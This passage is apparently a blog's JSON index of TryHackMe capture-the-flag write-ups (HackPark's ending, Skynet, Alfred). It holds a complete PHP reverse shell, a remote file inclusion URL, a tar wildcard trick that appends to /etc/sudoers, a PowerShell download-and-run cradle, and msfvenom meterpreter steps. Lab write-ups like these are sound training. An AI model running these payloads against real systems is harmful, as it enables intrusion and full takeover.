and we can use that in our favor.\nNow we put in background the meterpreter shell, and then we want to restart the listener again.\nNext thing to do is, rename the reverse shell in /windows/temp to Message.exe\nThen remove Message.exe from the SystemScheduler directory, and put the reverse shell now named Message.exe in it.\nNow we just need to start the process.\n(Do this with ./Message.exe or Start-Process “Message.exe”)\nAnd we got a Admin shell!\nThen I found the jeff flag in: C:\\Users\\Jeff\\Desktop\\user.txt\nAnd the root flag in: C:\\Users\\Administrator\\Desktop\\root.txt\n","date":"2023-12-28T11:00:00+01:00","image":"https://raw.githubusercontent.com/Blueaulo/HackPark-writeup-THM/main/f9435039-eb3c-4916-95b0-d0ba6c645332_Export-6a5d592a-f11c-4d5a-b4c1-719215eeb992/HackPark%20633b8e08ffeb4b57aad24df8cd964607/Untitled.png","permalink":"https://simonefelici.github.io/p/hackpark-writeup-thm/","title":"HackPark Writeup THM"},{"content":"The first step is to do a nmap scan:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 sudo nmap -A \u0026lt;machine_ip\u0026gt; Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-29 09:06 EST Nmap scan report for 10.10.34.11 Host is up (0.062s latency). Not shown: 994 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA) | 256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA) |_ 256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Skynet 110/tcp open pop3 Dovecot pop3d |_pop3-capabilities: AUTH-RESP-CODE RESP-CODES CAPA SASL UIDL PIPELINING TOP 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 143/tcp open imap Dovecot imapd |_imap-capabilities: SASL-IR more ENABLE LOGINDISABLEDA0001 OK IDLE post-login listed capabilities IMAP4rev1 have ID Pre-login LITERAL+ LOGIN-REFERRALS 445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP) We can see that it has:\nSSH HTTP pop3 netbios imap and samba open The most interessing are ssh, http and samba.\nThe first thing that I am going to do is, enumerate samba, as sugested by the room.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse \u0026lt;machine_ip\u0026gt; Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-29 09:32 EST Nmap scan report for 10.10.34.11 Host is up (0.060s latency). PORT STATE SERVICE 445/tcp open microsoft-ds Host script results: | smb-enum-shares: | account_used: guest | \\\\10.10.34.11\\IPC$: | Type: STYPE_IPC_HIDDEN | Comment: IPC Service (skynet server (Samba, Ubuntu)) | Users: 1 | Max Users: \u0026lt;unlimited\u0026gt; | Path: C:\\tmp | Anonymous access: READ/WRITE | Current user access: READ/WRITE | \\\\10.10.34.11\\anonymous: | Type: STYPE_DISKTREE | Comment: Skynet Anonymous Share | Users: 0 | Max Users: \u0026lt;unlimited\u0026gt; | Path: C:\\srv\\samba | Anonymous access: READ/WRITE | Current user access: READ/WRITE | \\\\10.10.34.11\\milesdyson: | Type: STYPE_DISKTREE | Comment: Miles Dyson Personal Share | Users: 0 | Max Users: \u0026lt;unlimited\u0026gt; | Path: C:\\home\\milesdyson\\share | Anonymous access: \u0026lt;none\u0026gt; | Current user access: \u0026lt;none\u0026gt; | \\\\10.10.34.11\\print$: | Type: STYPE_DISKTREE | Comment: Printer Drivers | Users: 0 | Max Users: \u0026lt;unlimited\u0026gt; | Path: C:\\var\\lib\\samba\\printers | Anonymous access: \u0026lt;none\u0026gt; |_ Current user access: \u0026lt;none\u0026gt; | smb-enum-users: | SKYNET\\milesdyson (RID: 1000) | Full name: | Description: |_ Flags: Normal user account Nmap done: 1 IP address (1 host up) scanned in 13.61 seconds As we can see it has Anonymous open: \\10.10.34.11\\anonymous:\nSo I am going to enter in that folder.\n1 2 3 4 5 smb: \\\u0026gt; ls . D 0 Thu Nov 26 11:04:00 2020 .. D 0 Tue Sep 17 03:20:17 2019 attention.txt N 163 Tue Sep 17 23:04:59 2019 logs D 0 Wed Sep 18 00:42:16 2019 Inside that folder we find one file and a directory, I am just going to download them.\n1 2 3 4 cat attention.txt A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this. -Miles Dyson So, here we see Miles Dyson again, that tells everyone to change the passwords.\nIn the first log file instead we get a list of passwords, the newer is the one that we are searching for.\nThe other two are empty, but maybe there are other two accounts.\nNow that we have an username and password I tried to connect to the smb share of Miles, but it didn’t go weel:\n1 2 3 4 smbclient //10.10.34.11/milesdyson -U milesdyson Password for [WORKGROUP\\milesdyson]: session setup failed: NT_STATUS_LOGON_FAILURE So I just went to the next phase, the web page.\nFrom the web page we only get this thing, but we could do a directory fuzzing for more results.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 ffuf -u http://10.10.34.11/FUZZ -w /usr/share/wordlists/dirb/big.txt /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://10.10.34.11/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/big.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ .htaccess [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 69ms] .htpasswd [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 68ms] admin [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 56ms] ai [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 57ms] config [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 58ms] css [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 57ms] js [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 62ms] server-status [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 333ms] squirrelmail [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 56ms] :: Progress: [20469/20469] :: Job [1/1] :: 298 req/sec :: Duration: [0:00:37] :: Errors: 0 :: The one thing that we want to check is squirrel mail, where we are going to put our username and password that we found before.\nBy entering the mail server we see 3 emails, the first is the one interessing for now.\n1 2 We have changed your smb password after system malfunction. Password: \u0026lt;redacted\u0026gt; So that’s why I couldn’t access his share.\nAnother thing that we get from this is that we have found the two other accounts, probably skynet is the admin and serenakogan is another user.\nSo we go back to samba.\n1 2 3 4 5 6 7 8 9 10 11 12 13 smbclient //10.10.34.11/milesdyson -U milesdyson Password for [WORKGROUP\\milesdyson]: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Tue Sep 17 05:05:47 2019 .. D 0 Tue Sep 17 23:51:03 2019 Improving Deep Neural Networks.pdf N 5743095 Tue Sep 17 05:05:14 2019 Natural Language Processing-Building Sequence Models.pdf N 12927230 Tue Sep 17 05:05:14 2019 Convolutional Neural Networks-CNN.pdf N 19655446 Tue Sep 17 05:05:14 2019 notes D 0 Tue Sep 17 05:18:40 2019 Neural Networks and Deep Learning.pdf N 4304586 Tue Sep 17 05:05:14 2019 Structuring your Machine Learning Project.pdf N 3531427 Tue Sep 17 05:05:14 2019 And now we are in.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 smbclient //10.10.34.11/milesdyson -U milesdyson Password for [WORKGROUP\\milesdyson]: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Tue Sep 17 05:05:47 2019 .. D 0 Tue Sep 17 23:51:03 2019 Improving Deep Neural Networks.pdf N 5743095 Tue Sep 17 05:05:14 2019 Natural Language Processing-Building Sequence Models.pdf N 12927230 Tue Sep 17 05:05:14 2019 Convolutional Neural Networks-CNN.pdf N 19655446 Tue Sep 17 05:05:14 2019 notes D 0 Tue Sep 17 05:18:40 2019 Neural Networks and Deep Learning.pdf N 4304586 Tue Sep 17 05:05:14 2019 Structuring your Machine Learning Project.pdf N 3531427 Tue Sep 17 05:05:14 2019 9204224 blocks of size 1024. 5654060 blocks available As we can see his share is full of useless things, the only thing that is important is the notes folder, from there we can see that it has a txt file named important.txt\nGetting that file will reveal to us a hidden directory inside the web page.\nThis directory doesn’t tell us much.\nBut one thing that we can do is to FUZZ this.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 ffuf -u http://10.10.34.11/\u0026lt;redacted\u0026gt;/FUZZ -w /usr/share/wordlists/dirb/big.txt /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://10.10.34.11/\u0026lt;redacted\u0026gt;/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/big.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ .htaccess [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 59ms] .htpasswd [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 4154ms] administrator [Status: 301, Size: 335, Words: 20, Lines: 10, Duration: 58ms] :: Progress: [20469/20469] :: Job [1/1] :: 338 req/sec :: Duration: [0:00:39] :: Errors: 0 :: And we got another directory, an administrator page.\nAfter trying some password I decided to searcxh internet for exploits.\nI came accross this, a remote file ionclusion vuln.\nI tested it out and it works.\nUnfortunately with this method we can’t also get the shadow.\nSo I tried another FLI listed in here:\nhttp://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?\nFor this to work, I first need to generate a reverse shell:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 \u0026lt;?php // php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php // Copyright (C) 2007 pentestmonkey@pentestmonkey.net set_time_limit (0); $VERSION = \u0026#34;1.0\u0026#34;; $ip = \u0026#39;your_ip\u0026#39;; $port = 4444; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = \u0026#39;uname -a; w; id; /bin/bash -i\u0026#39;; $daemon = 0; $debug = 0; if (function_exists(\u0026#39;pcntl_fork\u0026#39;)) { $pid = pcntl_fork(); if ($pid == -1) { printit(\u0026#34;ERROR: Can\u0026#39;t fork\u0026#34;); exit(1); } if ($pid) { exit(0); // Parent exits } if (posix_setsid() == -1) { printit(\u0026#34;Error: Can\u0026#39;t setsid()\u0026#34;); exit(1); } $daemon = 1; } else { printit(\u0026#34;WARNING: Failed to daemonise. This is quite common and not fatal.\u0026#34;); } chdir(\u0026#34;/\u0026#34;); umask(0); // Open reverse connection $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit(\u0026#34;$errstr ($errno)\u0026#34;); exit(1); } $descriptorspec = array( 0 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;r\u0026#34;), // stdin is a pipe that the child will read from 1 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;w\u0026#34;), // stdout is a pipe that the child will write to 2 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;w\u0026#34;) // stderr is a pipe that the child will write to ); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit(\u0026#34;ERROR: Can\u0026#39;t spawn shell\u0026#34;); exit(1); } stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit(\u0026#34;Successfully opened reverse shell to $ip:$port\u0026#34;); while (1) { if (feof($sock)) { printit(\u0026#34;ERROR: Shell connection terminated\u0026#34;); break; } if (feof($pipes[1])) { printit(\u0026#34;ERROR: Shell process terminated\u0026#34;); break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { if ($debug) printit(\u0026#34;SOCK READ\u0026#34;); $input = fread($sock, $chunk_size); if ($debug) printit(\u0026#34;SOCK: $input\u0026#34;); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { if ($debug) printit(\u0026#34;STDOUT READ\u0026#34;); $input = fread($pipes[1], $chunk_size); if ($debug) printit(\u0026#34;STDOUT: $input\u0026#34;); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { if ($debug) printit(\u0026#34;STDERR READ\u0026#34;); $input = fread($pipes[2], $chunk_size); if ($debug) printit(\u0026#34;STDERR: $input\u0026#34;); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) { if (!$daemon) { print \u0026#34;$string\\n\u0026#34;; } } ?\u0026gt; start a python server python -m http.server 8000\nthen start a listener: nc -lvnp 444\nnow we go to this page:\n\u0026lt;machine_ip\u0026gt;/\u0026lt;redacted\u0026gt;/administrator/alerts/alertConfigField.php?urlConfig=http://10.18.20.116:8000/php.php\nAnd we have our reverse shell.\n1 2 3 4 5 6 7 8 9 10 11 nc -lvnp 4444 listening on [any] 4444 ... connect to [10.18.20.116] from (UNKNOWN) [10.10.34.11] 42912 Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux 09:39:18 up 1:34, 0 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) bash: cannot set terminal process group (1459): Inappropriate ioctl for device bash: no job control in this shell www-data@skynet:/$ From here we can go to miles home directory and find the user flag.\nNow we want to get the root flag.\nafter searching for a while, the only thing that seems interessing is this:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 cat /etc/crontab # /etc/crontab: system-wide crontab # Unlike any other crontab you don\u0026#39;t have to run the `crontab\u0026#39; # command to install the new version when you edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # m h dom mon dow user command */1 * * * * root /home/milesdyson/backups/backup.sh 17 * * * * root cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.monthly ) # There is a backup running all minutes, and it is using root privileges.\n1 2 3 4 5 cat backup.sh #!/bin/bash cd /var/www/html tar cf /home/milesdyson/backups/backup.tgz * This script is very simple, it just goes to the /var/www/html folder and archiving all of the data inside /home/milesdyson/backups/backup.tgz *\nThe thing is, that we can write inside the /var/www/html directory.\nSo we can use this GTFObin script:\nShell\nIt can be used to break out from restricted environments by spawning an interactive system shell.\ntar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh What you have to do is run the following in the /var/www/html folder (which is being backed up).\n1 2 3 echo \u0026#39;echo \u0026#34;www-data ALL=(root) NOPASSWD: ALL\u0026#34; \u0026gt;\u0026gt; /etc/sudoers\u0026#39; \u0026gt; sudo.sh touch \u0026#34;/var/www/html/--checkpoint-action=exec=sh sudo.sh\u0026#34; touch \u0026#34;/var/www/html/--checkpoint=1\u0026#34; And after a minute we have root access just by using: sudo su\n","date":"2023-12-28T00:00:00Z","image":"https://raw.githubusercontent.com/Blueaulo/Skynet-writeup-THM/main/7fc92bc4-a2b5-44d0-ab51-5e8f215ec84e_Export-80e18829-5de1-4929-9c44-c2cd3e77dbd6/Skynet%20c2176ba8d5aa4c6dbbc98874be4822d3/Untitled.png","permalink":"https://simonefelici.github.io/p/skynet-writeup-thm/","title":"Skynet Writeup THM"},{"content":"Initial Access Exploiting Jenkins,\nJenkins is a tool used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made changes to it.\nFirst of all I am going to scan the machine, for this I only know that the machine does not respond to ping, and I only need TCP ports,\n1 2 3 4 5 6 7 8 9 10 11 12 nmap -sT -Pn 10.10.207.2 Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-26 10:41 EST Nmap scan report for 10.10.207.2 Host is up (0.058s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 3389/tcp open ms-wbt-server 8080/tcp open http-proxy Nmap done: 1 IP address (1 host up) scanned in 5.65 seconds This is the output.\nPort 80 is hosting a site, which tells me important informations:\nI got a possible username and password: Bruce Wayne\nAnd an email: alfred@wayneenterprises.com\nBut that’s it for now.\nPort 8080 is where Jenkins is hosted.\nUpon entering the page, there is a login portal, after trying “Bruce Wayne” and several other password, I am reminded that this is in the description of the room:\n“common misconfiguration on a widely used automation server”\nSo i tried admin:admin, which worked.\nNow I got control over Jenkins!\nThe first thing to do is searching for some type of tool that I can use to get a reverse shell:\nhttps://github.com/samratashok/nishang\nFirst I tried with the script console.\nBut it didn’t work because it can’t download the script like that, so I found a configure page under the project.\nBecause it has RDP open we can assume that the machine is running Windows.\nI am going to use this script: “https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1”\nWhich I downloaded in my machine, after that I started a python server: (this will be started in the same directory as the script, that’s because jenkins will download the script thanks to the python server)\n1 python3 -m http.server 8000 Then I start a listener:\n1 nc -lvnp 4444 And then used this script in the script console:\n1 *powershell iex (New-Object Net.WebClient).DownloadString(\u0026#39;http://your-ip:your-python-server-port/Invoke-PowerShellTcp.ps1\u0026#39;);Invoke-PowerShellTcp -Reverse -IPAddress 10.18.20.116 -Port 4444* After that I build the config we got a shell!\n1 2 3 4 5 6 7 8 nc -lvnp 4444 listening on [any] 4444 ... connect to [10.18.20.116] from (UNKNOWN) [10.10.207.2] 49236 Windows PowerShell running as user bruce on ALFRED Copyright (C) 2015 Microsoft Corporation. All rights reserved. PS C:\\Program Files (x86)\\Jenkins\\workspace\\project\u0026gt; We can see that we are the user alfred\\bruce\n1 2 PS C:\\Program Files (x86)\\Jenkins\\workspace\\project\u0026gt;whoami alfred\\bruce Now I need the user flag, which I found in the user Desktop:\nPS C:\\Users\\bruce\\Desktop\u0026gt; ls\n1 2 3 4 5 6 7 PS C:\\Users\\bruce\\Desktop\u0026gt; ls Directory: C:\\\\Users\\\\bruce\\\\Desktop Mode LastWriteTime Length Name a--- 10/25/2019 11:22 PM 32 user.txt Now, I am going to switch this scuffed revshell in an imrpoved version, we can do this using the meterpreter shell.\nUpgrading the shell Leave your previous connection OPEN.\nWe create our payload:\nmsfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.18.20.116 LPORT=4555 -f exe -o revshellps1.exe\nAfter creating this payload, download it to the machine using the same method in the previous step:\npowershell \u0026quot;(New-Object System.Net.WebClient).Downloadfile('http://10.18.20.116:8000/revshellps1.exe','revshellps1.exe')\u0026quot;\nNow that we have done that, we need to use Metasploit:\n1 2 3 4 5 6 7 8 9 10 11 12 **use exploit/multi/handler** [*] Using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) \u0026gt; set PAYLOAD windows/meterpreter/reverse_tcp PAYLOAD =\u0026gt; windows/meterpreter/reverse_tcp msf6 exploit(multi/handler) \u0026gt; set LHOST Your_Machine_IP LHOST =\u0026gt; 10.18.20.116 msf6 exploit(multi/handler) \u0026gt; set LPORT Your_Port(Same as the one you used for creating the payload) LPORT =\u0026gt; 4555 msf6 exploit(multi/handler) \u0026gt; run Once we run, we nee to go in our previous connection(The one we created with nc) and start the process:\n1 Start-Process \u0026#34;shell-name.exe” You will find the shell under: C:\\Program Files (x86)\\Jenkins\\workspace\\project\nNow that we have a stable shell, we can try to gain major privileges!\nPrivilege Escalation First thing we do is:\nwhoami /priv\nWith this we can see all the Enabled privileges\n(SeDebugPrivilege, SeImpersonatePrivilege) Those are the one that we find interessing.\nThen we check for the available tokens:\nimpersonate_token\nAnd we can see the BUILTIN\\Administrators token available\nSo we try to impersonate the token:\n1 2 3 4 5 meterpreter \u0026gt; impersonate_token \u0026#34;BUILTIN\\Administrators\u0026#34; [-] Warning: Not currently running as SYSTEM, not all tokens will be available Call rev2self if primary process token is SYSTEM [+] Delegation token available [+] Successfully impersonated user **NT AUTHORITY\\SYSTEM** Even though you have a higher privileged token, you may not have the permissions of a privileged user.\nTo go around that we can migrate to a process with the correct privileges.\nFirst we use ps to view the processes, then we grab the PID of services.exe, which we pick because is it normally a ssafe option.\nand we migrate to that PID:\n1 migrate PID-OF-PROCESS Now we should have full SYSTEM privileges!!\n","date":"2023-12-26T00:00:00Z","image":"https://raw.githubusercontent.com/Blueaulo/Alfred-writeup-THM/main/03c7fd6c-be68-4659-9c82-37743811ebdb_Export-f74cfa2b-d9f8-4ed2-b2f2-f5d8cdd8251d/Alfred%20ebebc7814aa2443aac5154421745f1d8/Untitled.png","permalink":"https://simonefelici.github.io/p/alfred-writeup-thm/","title":"Alfred Writeup THM"}]